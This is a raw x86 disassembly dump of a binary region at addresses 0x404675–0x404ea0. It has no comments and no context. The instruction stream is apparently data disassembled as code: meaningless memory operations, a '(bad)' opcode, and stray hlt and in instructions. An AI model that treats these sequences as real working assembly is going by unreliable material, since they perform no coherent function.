  404675:	add    DWORD PTR [edx+ebx*8],eax
  404678:	add    BYTE PTR [eax],al
  40467a:	mov    BYTE PTR [esp],ah
  40467d:	test   al,0x0
  40467f:	inc    eax
  404680:	add    al,al
  404682:	xor    BYTE PTR [edx],0xf4
  404685:	add    BYTE PTR [bp+si],al
  404688:	xchg   esi,eax
  404689:	or     BYTE PTR [ebx+0x5039d60],dl
  40468f:	add    dl,al
  404691:	xor    al,0x5a
  404693:	test   BYTE PTR [ecx+0x60],ah
  404696:	add    BYTE PTR [ecx-0x24],0x50
  40469a:	add    ah,BYTE PTR [eax+0x155f02]
  4046a0:	test   BYTE PTR [eax],bh
  4046a2:	jo     0x4046ae
  4046a4:	sub    bh,BYTE PTR [ecx-0x5e7b3dff]
  4046aa:	sbb    al,al
  4046ac:	sbb    BYTE PTR [edx],al
  4046ae:	add    DWORD PTR [eax-0x60],ecx
  4046b1:	xor    BYTE PTR [eax+0x104281a2],al
  4046b7:	add    BYTE PTR [ebx],al
  4046b9:	inc    eax
  4046ba:	add    BYTE PTR [eax],al
  4046bc:	xor    al,0x3
  4046be:	sub    DWORD PTR [edx+0x0],ecx
  4046c1:	sbb    ah,bh
  4046c3:	add    BYTE PTR [ecx+0x68],al
  4046c6:	lea    edx,[edx]
  4046c8:	add    al,0x10
  4046ca:	push   eax
  4046cb:	sub    BYTE PTR [ebx+eax*8],cl
  4046ce:	inc    eax
  4046cf:	or     eax,DWORD PTR [edx]
  4046d1:	and    BYTE PTR [ecx],0x9
  4046d4:	call   DWORD PTR ds:0x4381f8
  4046da:	inc    eax
  4046db:	add    DWORD PTR [eax+0x4048e380],ebx
  4046e1:	mov    eax,ds:0x14112144
  4046e6:	add    DWORD PTR [edx-0x78],eax
  4046e9:	add    BYTE PTR [ecx],al
  4046eb:	rcl    BYTE PTR [edx],0x48
  4046ee:	or     BYTE PTR [eax],dl
  4046f0:	adc    BYTE PTR [ebp+0x16],0x0
  4046f4:	and    bl,BYTE PTR [eax]
  4046f6:	add    DWORD PTR [esi],ebp
  4046f8:	inc    ecx
  4046f9:	mov    al,ds:0x80005b25
  4046fe:	and    BYTE PTR [eax],al
  404700:	inc    eax
  404701:	test   BYTE PTR [eax],ah
  404703:	add    DWORD PTR [ecx],esp
  404705:	add    BYTE PTR [esp+eiz*4+0xc93865],al
  40470c:	pop    edx
  40470d:	sub    dh,BYTE PTR [ecx]
  40470f:	cwde   
  404710:	add    al,cl
  404712:	or     DWORD PTR [edx+0x42560c0],eax
  404718:	stos   BYTE PTR es:[edi],al
  404719:	cmp    dl,al
  40471b:	adc    BYTE PTR [esp+eax*1],al
  40471e:	inc    edx
  40471f:	add    BYTE PTR [eax],al
  404721:	enter  0x4062,0x2
  404725:	in     al,0x22
  404727:	inc    ecx
  404728:	rcl    DWORD PTR [ecx],1
  40472a:	or     BYTE PTR [eax-0x7ffff734],al
  404730:	and    BYTE PTR [eax],al
  404732:	and    BYTE PTR [ebx],ah
  404734:	mov    al,ds:0x400104c6
  404739:	and    al,0x24
  40473b:	add    al,0x20
  40473d:	or     BYTE PTR [edx],al
  40473f:	jo     0x404789
  404741:	and    BYTE PTR [esi],0xca
  404744:	and    BYTE PTR [eax*2+0x100a8c17],dh
  40474b:	fs add al,0x20
  40474e:	add    esp,edx
  404750:	adc    eax,0x4282402
  404755:	test   al,0x91
  404757:	add    BYTE PTR [eax],cl
  404759:	sub    BYTE PTR [ecx],0x10
  40475c:	add    BYTE PTR [eax+edx*2],al
  40475f:	push   eax
  404760:	add    BYTE PTR [eax+0x0],al
  404763:	add    BYTE PTR [edi+0x28],ah
  404766:	or     dl,BYTE PTR [eax]
  404768:	add    BYTE PTR [eax],ch
  40476a:	mov    esp,0x8a44249c
  40476f:	xchg   DWORD PTR [eax],edx
  404771:	or     dh,BYTE PTR [ecx]
  404773:	push   es
  404774:	add    BYTE PTR [esi-0x52],al
  404777:	mov    al,0x0
  404779:	add    BYTE PTR [esi+0x12],ah
  40477c:	push   es
  40477d:	rol    BYTE PTR [eax],0x54
  404780:	dec    eax
  404781:	mov    BYTE PTR [ebx+0x4205080],dl
  404787:	nop
  404788:	and    BYTE PTR [edx],dh
  40478a:	add    DWORD PTR [eax],eax
  40478c:	popa   
  40478d:	pop    eax
  40478e:	add    BYTE PTR [eax],dl
  404790:	adc    al,0x12
  404792:	inc    esp
  404793:	add    al,0x42
  404796:	cmp    al,0x82
  404798:	adc    cl,BYTE PTR [eax]
  40479a:	sub    BYTE PTR [eax],dl
  40479c:	add    cl,BYTE PTR [ecx]
  40479e:	inc    esp
  40479f:	cmp    eax,0x4100c844
  4047a4:	adc    bl,BYTE PTR [ecx]
  4047a6:	adc    al,0x0
  4047a8:	mov    ds:0x44282,eax
  4047ad:	add    DWORD PTR [eax+0x11080400],esp
  4047b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047b4:	adc    BYTE PTR [ecx+0x3c01c838],ch
  4047ba:	add    al,BYTE PTR [edx]
  4047bc:	add    BYTE PTR [esi],cl
  4047be:	inc    eax
  4047bf:	or     al,BYTE PTR [eax+eiz*1]
  4047c2:	loopne 0x4047c9
  4047c4:	ror    BYTE PTR [eax],0x2
  4047c7:	ror    al,0x34
  4047ca:	inc    eax
  4047cb:	mov    ebp,0x88145c10
  4047d0:	or     al,0x40
  4047d2:	or     dl,BYTE PTR [eax+ecx*1]
  4047d5:	dec    eax
  4047d6:	and    DWORD PTR [ecx+0x40],eax
  4047d9:	add    DWORD PTR [edx],0x8870d425
  4047df:	add    BYTE PTR [eax+0xd000103],al
  4047e5:	adc    DWORD PTR ds:0x801108,eax
  4047eb:	inc    eax
  4047ec:	add    BYTE PTR [eax+0xa],al
  4047ef:	push   0x4a00102b
  4047f4:	mov    al,ds:0xa5c781
  4047f9:	nop
  4047fa:	test   al,0x0
  4047fc:	inc    esp
  4047fd:	add    al,0x84
  4047ff:	retf   
  404800:	sub    eax,0x20080705
  404805:	adc    eax,DWORD PTR [esi+0x5]
  404808:	daa    
  404809:	or     DWORD PTR [eax+eiz*1],eax
  40480c:	inc    eax
  40480d:	sbb    DWORD PTR [eax-0x5e],esp
  404810:	add    DWORD PTR [edx-0x68],0x52
  404814:	sub    eax,0x2d02000
  404819:	xor    DWORD PTR [eax],edx
  40481b:	inc    eax
  40481c:	add    al,0xc0
  40481e:	mov    al,ds:0x50115005
  404823:	loopne 0x404845
  404825:	add    ah,BYTE PTR [ecx+0x12c00008]
  40482b:	add    BYTE PTR [ecx+ebp*1-0x7f],0x0
  404830:	mov    ah,0x4
  404832:	or     BYTE PTR [ecx+ebx*2],0x4
  404836:	or     BYTE PTR [eax],dh
  404838:	and    BYTE PTR [eax+0x2e983f],0x0
  40483f:	pusha  
  404840:	xchg   edx,eax
  404841:	push   ecx
  404842:	push   esp
  404843:	sbb    BYTE PTR [ecx-0x7c],dh
  404846:	inc    ecx
  404847:	inc    eax
  404848:	inc    eax
  404849:	sbb    BYTE PTR [eax+eax*4+0x21],ah
  40484d:	and    dh,ah
  40484f:	loopne 0x404852
  404851:	inc    eax
  404852:	rol    BYTE PTR [edx+0x65430048],1
  404858:	adc    BYTE PTR [eax+edx*1+0x48223080],0xf0
  404860:	les    eax,FWORD PTR [eax]
  404862:	adc    al,BYTE PTR [edx]
  404864:	add    cl,BYTE PTR [esi+0x2212b829]
  40486a:	adc    BYTE PTR [ebp+eax*4+0x2a010140],dl
  404871:	int3   
  404872:	add    BYTE PTR [eax-0x4b],al
  404875:	sbb    BYTE PTR [eax+0x40009642],al
  40487b:	sbb    BYTE PTR [edx+0x5000c401],al
  404881:	adc    DWORD PTR [eax],eax
  404883:	sub    BYTE PTR [ebp+eax*4+0x9],bl
  404887:	mov    BYTE PTR [eax],bl
  404889:	loopne 0x404813
  40488b:	or     al,BYTE PTR [eax+0x44ad8168]
  404891:	add    dh,BYTE PTR [ecx-0x12]
  404894:	add    BYTE PTR [eax+0x5c052321],0xa4
  40489b:	adc    edx,DWORD PTR [edx+ecx*2]
  40489e:	dec    edx
  40489f:	and    bh,dl
  4048a1:	inc    eax
  4048a2:	or     cl,BYTE PTR [eax-0x80]
  4048a5:	cmp    BYTE PTR [eax-0x7c],cl
  4048a8:	and    eax,0x140601
  4048ad:	(bad)  
  4048ae:	shr    BYTE PTR [eax+0x35c08710],0x25
  4048b5:	inc    ecx
  4048b6:	or     BYTE PTR [eax],ah
  4048b8:	push   es
  4048b9:	add    BYTE PTR [eax],al
  4048bb:	push   0x12
  4048bd:	xchg   edx,eax
  4048be:	add    al,0x24
  4048c0:	inc    esp
  4048c1:	jo     0x404926
  4048c3:	add    BYTE PTR [eax],0x96
  4048c6:	mov    BYTE PTR [edx],ah
  4048c8:	and    BYTE PTR [eax],al
  4048ca:	adc    BYTE PTR [eax+ecx*1+0x2],al
  4048ce:	inc    edx
  4048cf:	and    DWORD PTR [ecx],0x11
  4048d2:	or     al,0x82
  4048d4:	and    BYTE PTR [ecx+0x22],0x26
  4048d8:	test   BYTE PTR [edx+0xb],ah
  4048db:	adc    BYTE PTR [eax],al
  4048dd:	and    BYTE PTR [eax+0x18514407],al
  4048e3:	loopne 0x4048e5
  4048e5:	popa   
  4048e6:	add    BYTE PTR [ecx],ch
  4048e8:	add    eax,0x44002200
  4048ed:	and    BYTE PTR [esi-0x60],dh
  4048f0:	add    BYTE PTR [eax],ah
  4048f2:	inc    ecx
  4048f3:	or     al,0x0
  4048f5:	or     DWORD PTR [ecx],0x85409312
  4048fb:	adc    BYTE PTR [ecx+eax*4+0x268041],al
  404902:	and    DWORD PTR [ecx+0x28092120],esp
  404908:	and    bl,dl
  40490a:	add    BYTE PTR [ecx+0x52c800b6],cl
  404910:	xor    ah,BYTE PTR [ebx-0x3f]
  404913:	adc    BYTE PTR [eax],al
  404915:	add    al,ch
  404917:	sub    al,0x20
  404919:	and    BYTE PTR [esi+0x61],al
  40491c:	xor    ah,BYTE PTR [eax]
  40491e:	and    eax,0xa1152b18
  404923:	or     BYTE PTR [edx+eax*1],0x0
  404927:	or     DWORD PTR [ebx+0x70003019],ecx
  40492d:	cmp    BYTE PTR [eax],al
  40492f:	add    BYTE PTR [ecx+0x12000880],0x50
  404936:	fsubr  DWORD PTR [eax]
  404938:	inc    eax
  404939:	mov    BYTE PTR [ecx+eax*1],al
  40493c:	mov    al,0x64
  40493e:	xchg   esp,eax
  40493f:	and    al,BYTE PTR [esi]
  404941:	add    DWORD PTR [eax+ecx*1+0xc000420],edx
  404948:	ficom  WORD PTR [ecx]
  40494a:	clc    
  40494b:	mov    dl,al
  40494d:	and    BYTE PTR [eax],al
  40494f:	push   eax
  404950:	add    al,0x3
  404952:	add    BYTE PTR [eax],dl
  404954:	pusha  
  404955:	add    BYTE PTR [eax-0x6ffbeb7f],cl
  40495b:	pusha  
  40495c:	pop    eax
  40495d:	and    BYTE PTR [eax+0x3],al
  404960:	mov    al,0x21
  404962:	dec    ecx
  404963:	push   esp
  404964:	popa   
  404965:	inc    ebp
  404966:	test   BYTE PTR [ebx-0x80],al
  404969:	add    BYTE PTR [ecx+0x10a10209],ah
  40496f:	add    esp,edx
  404971:	inc    esp
  404972:	and    DWORD PTR ds:0x20013910,0x50650401
  40497c:	sub    dl,ah
  40497e:	inc    ebx
  40497f:	push   0x48c212c1
  404984:	mov    edi,DWORD PTR [eax]
  404986:	add    BYTE PTR [edx],0x2c
  404989:	and    BYTE PTR [eax],al
  40498b:	xchg   esp,eax
  40498c:	xor    BYTE PTR [edi],cl
  40498e:	adc    DWORD PTR [eax],eax
  404990:	add    al,0x12
  404992:	push   es
  404993:	inc    esp
  404994:	or     DWORD PTR [eax+eax*1],edx
  404997:	inc    edx
  404998:	pop    es
  404999:	sbb    BYTE PTR [eax],al
  40499b:	or     DWORD PTR [edx],eax
  40499d:	add    cl,ah
  40499f:	sub    al,0x0
  4049a1:	and    dl,BYTE PTR [edx+0x610cc898]
  4049a7:	or     eax,0x20000022
  4049ac:	push   esp
  4049ad:	add    BYTE PTR [eax+0x41],al
  4049b0:	or     bh,BYTE PTR [eax+eax*2]
  4049b3:	push   eax
  4049b4:	add    BYTE PTR [edx],0x86
  4049b7:	pop    eax
  4049b8:	add    al,0x50
  4049ba:	add    BYTE PTR [ecx],al
  4049bc:	add    cl,BYTE PTR [eax+0x12040018]
  4049c2:	or     BYTE PTR [eax+0x24097003],dh
  4049c8:	adc    al,ah
  4049ca:	and    BYTE PTR [eax],al
  4049cc:	inc    eax
  4049cd:	sbb    DWORD PTR [eax],edx
  4049cf:	push   es
  4049d0:	bound  eax,QWORD PTR [eax+0x4e65188]
  4049d6:	jo     0x404960
  4049d8:	pop    eax
  4049d9:	adc    cl,BYTE PTR [ebp+0x11]
  4049dc:	add    DWORD PTR [edx],ebx
  4049de:	or     eax,0x500000cc
  4049e3:	add    al,BYTE PTR [ebx]
  4049e5:	xor    al,0x4
  4049e7:	add    ah,BYTE PTR [edi]
  4049e9:	add    BYTE PTR [eax],ah
  4049eb:	or     ch,BYTE PTR [ecx-0x6f9fef58]
  4049f1:	sub    BYTE PTR [eax+eax*1-0x7bdea973],dl
  4049f8:	aaa    
  4049f9:	add    BYTE PTR [eax+eiz*2+0x451a0220],0x1
  404a01:	xor    al,BYTE PTR [eax]
  404a03:	and    BYTE PTR ds:0x8c402206,dl
  404a09:	aam    0x0
  404a0b:	push   edi
  404a0c:	add    al,0x1
  404a0f:	and    al,0x1
  404a11:	pusha  
  404a12:	shr    DWORD PTR [edx],1
  404a14:	add    BYTE PTR [eax-0x57befdd0],al
  404a1a:	and    al,BYTE PTR [eax+0x20]
  404a1d:	and    al,0x5
  404a1f:	push   ecx
  404a20:	add    eax,0x18040053
  404a25:	nop
  404a26:	into   
  404a27:	or     BYTE PTR [eax],cl
  404a29:	ror    BYTE PTR [eax],0x3
  404a2c:	inc    eax
  404a2d:	add    al,BYTE PTR [ebp+0x1c108a70]
  404a33:	inc    esp
  404a34:	sub    BYTE PTR [edx+0x1a908040],cl
  404a3a:	sbb    eax,0x8002140
  404a3f:	add    BYTE PTR [ecx-0x1e],al
  404a42:	add    al,BYTE PTR [esi+0x2d]
  404a45:	push   es
  404a46:	and    BYTE PTR [eax],bl
  404a48:	inc    ecx
  404a49:	xor    BYTE PTR [eax],dl
  404a4b:	add    BYTE PTR [eax],cl
  404a4d:	adc    eax,0x44322281
  404a52:	add    ah,BYTE PTR [ebp+ecx*1+0x40]
  404a56:	add    DWORD PTR [eax+eax*4],0x4133005a
  404a5d:	add    BYTE PTR [ebx+eiz*8],al
  404a60:	adc    BYTE PTR [eax+0x20326874],al
  404a66:	mov    DWORD PTR [ecx],edx
  404a68:	add    cl,BYTE PTR [eax+0x4389084]
  404a6e:	js     0x404a86
  404a70:	add    al,0x48
  404a72:	sub    al,0xe1
  404a74:	inc    edx
  404a75:	sbb    dl,BYTE PTR [eax]
  404a77:	add    al,0x10
  404a79:	or     BYTE PTR [esi+edx*1],0x0
  404a7d:	add    BYTE PTR [ecx],al
  404a7f:	ret    
  404a80:	add    BYTE PTR [edx],0xc
  404a83:	sbb    BYTE PTR [edx],ah
  404a85:	add    BYTE PTR [esi-0x80],al
  404a88:	adc    BYTE PTR [edx+0x42],ah
  404a8b:	add    cl,BYTE PTR [eax+0x5050200]
  404a91:	add    BYTE PTR [eax],dl
  404a93:	and    DWORD PTR [eax+0x28],0xc20f111
  404a9a:	or     al,0x6
  404a9c:	mov    WORD PTR [eax],es
  404a9e:	adc    BYTE PTR [eax+0x9808451],0xa5
  404aa5:	inc    eax
  404aa6:	xchg   al,al
  404aa8:	add    al,0x12
  404aaa:	adc    BYTE PTR [eax-0x7fe12dff],0x8
  404ab1:	or     BYTE PTR ds:0x4a42881,dl
  404ab7:	or     al,0x10
  404ab9:	mov    ds:0x92268122,eax
  404abe:	int3   
  404abf:	xor    al,BYTE PTR [edx]
  404ac1:	mov    esp,0x1161
  404ac6:	add    al,0x62
  404ac8:	and    al,0x60
  404aca:	test   al,0x0
  404acc:	add    dh,BYTE PTR [esi-0x5de59f00]
  404ad2:	or     al,0x4
  404ad4:	add    DWORD PTR [eax],0x2110a807
  404ada:	mov    BYTE PTR [eax],dl
  404adc:	adc    DWORD PTR [ecx+0xc10430],edx
  404ae2:	mov    edx,0xc0c01201
  404ae7:	and    eax,esp
  404ae9:	sub    BYTE PTR [eax],dl
  404aeb:	inc    esi
  404aec:	or     DWORD PTR [edx],eax
  404aee:	add    cl,al
  404af0:	mov    dh,0x22
  404af2:	mov    al,ds:0x80602490
  404af7:	pusha  
  404af8:	add    BYTE PTR [eax],al
  404afa:	add    al,0x0
  404afc:	add    DWORD PTR [ebx+0x0],0xffffffa0
  404b00:	in     al,0x6
  404b02:	add    BYTE PTR [eax+edi*4-0x7f2ff7df],0x81
  404b0a:	mov    cl,0x10
  404b0c:	push   es
  404b0d:	sbb    BYTE PTR [eax+0x4],bl
  404b10:	inc    ecx
  404b11:	adc    DWORD PTR [eax],0x16002012
  404b17:	push   0x806c81c0
  404b1c:	and    BYTE PTR [eax],ah
  404b1e:	add    BYTE PTR [esi+eax*2-0x35cbfdf0],dh
  404b25:	pop    ss
  404b26:	add    al,0x2
  404b28:	push   ecx
  404b29:	add    BYTE PTR [eax+ebp*2],0x0
  404b2d:	sbb    al,0x4
  404b2f:	add    al,BYTE PTR [edx+ebx*4-0x75fbf527]
  404b36:	adc    BYTE PTR [ebx],ah
  404b38:	fs adc al,0x10
  404b3b:	push   ebp
  404b3c:	sbb    BYTE PTR [eax+0x14],dl
  404b3f:	adc    DWORD PTR ds:0x51b1898,ebp
  404b45:	push   ecx
  404b46:	or     DWORD PTR [edx-0x3fbfbfe8],eax
  404b4c:	add    BYTE PTR [ebp+0x32],bl
  404b4f:	and    al,0x5
  404b51:	or     BYTE PTR [eax],al
  404b53:	hlt    
  404b54:	rol    BYTE PTR [eax],1
  404b56:	fcomp  DWORD PTR [eax+eiz*2]
  404b59:	inc    eax
  404b5a:	sub    ch,cl
  404b5c:	pusha  
  404b5d:	and    BYTE PTR [esi],al
  404b5f:	sbb    al,0x0
  404b61:	add    ah,BYTE PTR [eax+0x15]
  404b64:	add    eax,0x44f3c402
  404b69:	call   0x8947:0x88005100
  404b70:	pusha  
  404b71:	add    DWORD PTR [eax],ecx
  404b73:	jo     0x404b75
  404b75:	or     BYTE PTR [eax+0x284025a4],dl
  404b7b:	enter  0xc8a8,0x5
  404b7f:	mov    ch,0xd1
  404b81:	or     DWORD PTR [edx+eax*1],eax
  404b84:	mov    BYTE PTR [eax],0x16
  404b87:	or     bl,BYTE PTR [ebx+eiz*1+0x54750460]
  404b8e:	or     BYTE PTR [eax],al
  404b90:	dec    eax
  404b91:	test   BYTE PTR [edx+0x42010080],al
  404b97:	xchg   esp,eax
  404b98:	dec    ecx
  404b99:	add    cl,BYTE PTR [ebx-0x67]
  404b9c:	mov    al,0x80
  404b9e:	or     al,0x40
  404ba0:	add    al,0x11
  404ba2:	or     DWORD PTR [eax+eiz*2+0x5d],esp
  404ba6:	adc    BYTE PTR [eax+eax*2],ch
  404ba9:	dec    eax
  404baa:	add    al,BYTE PTR [eax]
  404bac:	push   0x48
  404bae:	add    cl,BYTE PTR [eax-0x37ffffe4]
  404bb4:	rcl    BYTE PTR [eax],0x51
  404bb7:	pop    esp
  404bb8:	add    eax,0x20041881
  404bbd:	test   BYTE PTR [eax],al
  404bbf:	dec    esi
  404bc0:	add    BYTE PTR [eax+esi*2],0x2
  404bc4:	add    DWORD PTR [esi+eiz*8],0x20c0480
  404bcb:	add    al,BYTE PTR [edi+0x0]
  404bce:	xor    BYTE PTR [eax+edx*4],al
  404bd1:	rol    BYTE PTR [eax+0x280c8802],1
  404bd7:	add    al,0xa1
  404bd9:	and    BYTE PTR [eax],dl
  404bdb:	mov    al,0x5
  404bdd:	sub    al,0x80
  404bdf:	dec    eax
  404be0:	cwde   
  404be1:	add    al,0x8
  404be4:	xor    eax,0x934a8048
  404be9:	mov    cl,BYTE PTR [edx+0x14102239]
  404bef:	test   al,0x44
  404bf1:	and    al,cl
  404bf3:	add    BYTE PTR [edx],al
  404bf5:	add    al,0x0
  404bf7:	and    bh,BYTE PTR [eax-0x30]
  404bfa:	jb     0x404c08
  404bfc:	add    BYTE PTR [eax+eax*1+0x4420020a],0x21
  404c04:	xor    BYTE PTR [eax+0x21],al
  404c07:	add    al,0xcf
  404c09:	mov    eax,ds:0x12344194
  404c0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c0f:	xor    DWORD PTR [ecx+0x40150500],0x50000a21
  404c19:	xor    BYTE PTR ds:0x1e000,0x0
  404c20:	add    BYTE PTR [esi],al
  404c22:	dec    eax
  404c23:	or     BYTE PTR [eax+0x10],al
  404c26:	sbb    cl,0x31
  404c29:	push   ds
  404c2a:	sbb    BYTE PTR [eax-0x78],0xc8
  404c2e:	or     al,BYTE PTR [eax+0x2600240]
  404c34:	and    cl,BYTE PTR [eax+eax*4]
  404c37:	test   BYTE PTR [ebp+0x20018351],ah
  404c3d:	dec    esp
  404c3e:	adc    BYTE PTR [eax],0x80
  404c41:	add    DWORD PTR [ecx+0x9118881],edx
  404c47:	inc    esp
  404c48:	sub    BYTE PTR [ebp+0x8016202],al
  404c4e:	and    al,0xc
  404c50:	and    ah,cl
  404c52:	add    al,BYTE PTR [eax]
  404c54:	dec    eax
  404c55:	or     esp,DWORD PTR [eax+0x9008480]
  404c5b:	add    ah,dh
  404c5d:	add    DWORD PTR [eax+eax*1],esp
  404c60:	inc    esp
  404c61:	add    BYTE PTR [edx],al
  404c63:	add    bl,BYTE PTR [eax+0x4a240250]
  404c69:	adc    al,0x20
  404c6b:	add    eax,0x36880130
  404c70:	xor    DWORD PTR [edx+0x411030c0],ecx
  404c76:	add    ah,BYTE PTR [edx+eax*4+0x1a1c010]
  404c7d:	and    BYTE PTR [eax],cl
  404c7f:	add    BYTE PTR [eax],al
  404c81:	add    eax,DWORD PTR [ecx]
  404c83:	and    BYTE PTR [eax+0x4244ab],al
  404c89:	adc    BYTE PTR [eax],bh
  404c8b:	sub    al,BYTE PTR [ecx+0x44204924]
  404c91:	aam    0x9
  404c93:	dec    esp
  404c94:	rol    DWORD PTR [ecx-0x5f],0x0
  404c98:	adc    al,0x22
  404c9a:	inc    ecx
  404c9b:	add    esp,DWORD PTR [eax-0x7ef8f000]
  404ca1:	lea    edx,[eax+ecx*4]
  404ca4:	add    BYTE PTR [eax+0x5c],dl
  404ca7:	push   ss
  404ca8:	or     DWORD PTR cs:[eax+0x71000021],0x3990005
  404cb3:	add    BYTE PTR [eax],al
  404cb5:	push   ss
  404cb6:	add    BYTE PTR [eax],0x10
  404cb9:	sbb    BYTE PTR [edx+ebp*1+0x0],dl
  404cbd:	add    DWORD PTR [ebx+eiz*4],eax
  404cc0:	cmp    BYTE PTR [ecx-0x70],al
  404cc3:	and    al,0x12
  404cc5:	add    BYTE PTR [ecx+0x290c0671],al
  404ccb:	add    BYTE PTR [edx-0x777ebbd8],al
  404cd1:	push   es
  404cd2:	dec    edx
  404cd3:	add    BYTE PTR [ecx],dl
  404cd5:	add    BYTE PTR [eax+edx*1],bl
  404cd8:	add    BYTE PTR [eax],ah
  404cda:	adc    BYTE PTR [eax],dh
  404cdc:	xor    al,0x48
  404cde:	inc    ecx
  404cdf:	push   ebx
  404ce0:	inc    edx
  404ce1:	sub    DWORD PTR [ebp-0x7a],ecx
  404ce4:	dec    eax
  404ce5:	push   es
  404ce6:	nop
  404ce7:	inc    edx
  404ce8:	add    BYTE PTR [edx+0xe],cl
  404ceb:	or     al,0x80
  404ced:	or     BYTE PTR [esi+0x10],al
  404cf0:	add    DWORD PTR [ecx+eax*1-0x68],eax
  404cf4:	and    al,0x22
  404cf6:	or     cl,BYTE PTR [eax+edx*1]
  404cf9:	and    BYTE PTR [ebp+0xca8c490],0x12
  404d00:	or     DWORD PTR [eax],ebx
  404d02:	inc    ecx
  404d03:	add    DWORD PTR [eax+edx*1],esp
  404d06:	add    BYTE PTR [edx],al
  404d08:	sbb    BYTE PTR [ecx-0x6c],0x68
  404d0c:	mov    al,BYTE PTR [ebp+0x1012088]
  404d12:	add    al,0x9c
  404d14:	or     BYTE PTR [ecx*4+0x68c1040],al
  404d1b:	add    BYTE PTR [eax],0x3c
  404d1e:	mov    WORD PTR [eax],es
  404d20:	and    al,BYTE PTR [eax+0x1882402]
  404d26:	add    DWORD PTR [eax],ecx
  404d28:	inc    eax
  404d29:	inc    eax
  404d2a:	add    al,0x0
  404d2c:	test   DWORD PTR [esi],ecx
  404d2e:	mov    al,ds:0x2801000
  404d33:	or     BYTE PTR [esi+0x0],al
  404d36:	add    BYTE PTR [eax+0x74],al
  404d39:	add    eax,DWORD PTR [eax]
  404d3b:	add    DWORD PTR [eax+eax*1+0x74],ecx
  404d3f:	or     BYTE PTR [ebx+0x2],cl
  404d42:	adc    al,0x0
  404d44:	add    BYTE PTR [eax],ch
  404d46:	xor    al,0x46
  404d48:	sub    al,dl
  404d4a:	sub    al,BYTE PTR [esi+eiz*4-0x3af7ffcf]
  404d51:	add    DWORD PTR [edx-0x788fdef7],0x12030030
  404d5b:	and    eax,0x4c22a242
  404d60:	add    al,0x4
  404d62:	and    eax,0x4007
  404d67:	add    BYTE PTR [edx-0x6bfbff80],ah
  404d6d:	add    BYTE PTR [edx-0x5f8f84b0],0x0
  404d74:	add    BYTE PTR fs:[eax+0x5],dl
  404d78:	cdq    
  404d79:	add    DWORD PTR [ecx],ecx
  404d7b:	and    BYTE PTR [eax],0x67
  404d7e:	add    eax,0x622031
  404d83:	mov    al,ds:0x282740e4
  404d88:	mov    ds:0x4410222a,eax
  404d8d:	mov    BYTE PTR [ecx],dl
  404d8f:	adc    al,0x73
  404d91:	or     eax,0x218ee604
  404d96:	rol    BYTE PTR [edx],1
  404d98:	add    DWORD PTR [eax+eax*8],esp
  404d9b:	xchg   ebp,eax
  404d9c:	add    BYTE PTR [eax],ah
  404d9e:	add    BYTE PTR [eax+eax*2+0x2000000c],bl
  404da5:	or     BYTE PTR [edx],bl
  404da7:	fdiv   DWORD PTR [ecx]
  404da9:	or     ch,BYTE PTR [eax]
  404dab:	mov    BYTE PTR [eax+0x53],ah
  404dae:	add    eax,0x8640204c
  404db3:	add    BYTE PTR ds:0x9084000b,al
  404db9:	and    al,BYTE PTR [eax+0x45]
  404dbc:	add    BYTE PTR [esp+eax*1+0x4],al
  404dc0:	add    BYTE PTR [ecx+0x41180344],cl
  404dc6:	add    BYTE PTR [eax-0x70],0x0
  404dca:	add    BYTE PTR [ecx],0x90
  404dcd:	add    DWORD PTR [esp+ebx*2],eax
  404dd0:	cmp    edx,DWORD PTR [eax]
  404dd2:	jo     0x404de2
  404dd4:	rol    BYTE PTR [ecx],1
  404dd6:	adc    eax,0x1c7602
  404ddb:	add    DWORD PTR [eax-0x80],0x40089840
  404de2:	add    eax,esp
  404de4:	xor    BYTE PTR [eax+ebx*1+0x278020a],al
  404deb:	sbb    DWORD PTR [eax+0x4c204],eax
  404df1:	add    bl,BYTE PTR [eax]
  404df3:	add    BYTE PTR [eax+0x54880184],ah
  404df9:	inc    eax
  404dfa:	add    DWORD PTR [eax],edx
  404dfc:	inc    ecx
  404dfd:	sub    eax,0x208004
  404e02:	sub    BYTE PTR ds:0x46208400,dh
  404e08:	add    al,0x85
  404e0a:	xchg   esp,eax
  404e0b:	adc    BYTE PTR [ecx],bl
  404e0d:	add    bl,BYTE PTR [eax]
  404e0f:	and    BYTE PTR ds:0x19001411,cl
  404e15:	and    BYTE PTR [edx],dl
  404e17:	jo     0x404e59
  404e19:	adc    DWORD PTR [eax+0x10548],edx
  404e1f:	pop    eax
  404e20:	lss    eax,FWORD PTR [eax+edx*4-0x6f47df3a]
  404e28:	inc    eax
  404e29:	sbb    BYTE PTR [ecx+0x0],ch
  404e2c:	pusha  
  404e2d:	jae    0x404e4f
  404e2f:	add    eax,0x80604888
  404e34:	add    al,BYTE PTR [ecx]
  404e36:	adc    DWORD PTR [eax+0x21],esi
  404e39:	jo     0x404dcd
  404e3b:	and    BYTE PTR [edx+0x32f0108],0x0
  404e42:	mov    ebp,0x40216545
  404e47:	mov    ds:0x115008,al
  404e4c:	sbb    al,BYTE PTR [esp+ebp*4]
  404e4f:	sub    al,BYTE PTR [ecx-0x6e]
  404e52:	add    edx,DWORD PTR [ecx+0x78f40420]
  404e58:	nop
  404e59:	mov    dh,0x69
  404e5b:	add    ecx,esp
  404e5d:	and    dl,BYTE PTR [ebp-0x2ffbfdfe]
  404e63:	add    al,0x20
  404e65:	hlt    
  404e66:	and    dl,BYTE PTR [ecx]
  404e68:	add    al,0x1c
  404e6a:	push   0x51
  404e6c:	add    DWORD PTR [ecx],edi
  404e6e:	sbb    DWORD PTR [esp+edx*1],edx
  404e71:	add    BYTE PTR [eax],al
  404e73:	jmp    0x81c713fe
  404e78:	dec    eax
  404e79:	add    BYTE PTR [eax],cl
  404e7b:	add    BYTE PTR [edx],ch
  404e7d:	add    BYTE PTR [eax],cl
  404e7f:	inc    edx
  404e80:	add    al,0x8
  404e82:	and    BYTE PTR [eax+edx*1],al
  404e85:	adc    BYTE PTR [eax],dl
  404e87:	add    BYTE PTR [ecx],ah
  404e89:	jo     0x404e0b
  404e8b:	mov    al,0x4
  404e8d:	push   cs
  404e8e:	mov    ah,0xa0
  404e90:	add    BYTE PTR [ecx],ch
  404e92:	mov    BYTE PTR [eax+0x140790b2],al
  404e98:	xchg   edx,eax
  404e99:	nop
  404e9a:	adc    al,0x0
  404e9c:	or     BYTE PTR [eax],al
  404e9e:	dec    esp
  404e9f:	inc    esp
  404ea0:	add    ah,BYTE PTR [eax+0x202106e1]
